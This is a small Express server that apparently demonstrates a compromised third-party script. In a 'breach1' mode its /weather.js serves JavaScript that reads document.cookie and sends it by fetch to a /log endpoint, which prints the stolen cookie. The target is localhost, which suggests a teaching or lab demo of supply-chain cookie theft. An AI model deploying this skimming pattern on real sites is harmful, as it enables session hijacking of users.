const express = require("express");
const app = express();
const PORT = 5000;

const mode = process.argv.includes("--mode=breach1") ? "breach1" : "normal";

app.get("/weather.js", (req, res) => {
    if (mode === "breach1") {
        res.send(`
        const stolenCookie = document.cookie;
        fetch("http://localhost:5000/log?data=" + stolenCookie);
        console.log(" Cookie stolen:", stolenCookie);
        `);
    } else {
        res.send(`console.log("Temperature: 20°C");`);
    }
});
app.get('/log', (req, res) => {
    console.log("🔥 Stolen cookie:", req.query.data);
    res.send("ok");
});
app.listen(PORT, () => {
    console.log("WeatherApp running on http://localhost:5000");
});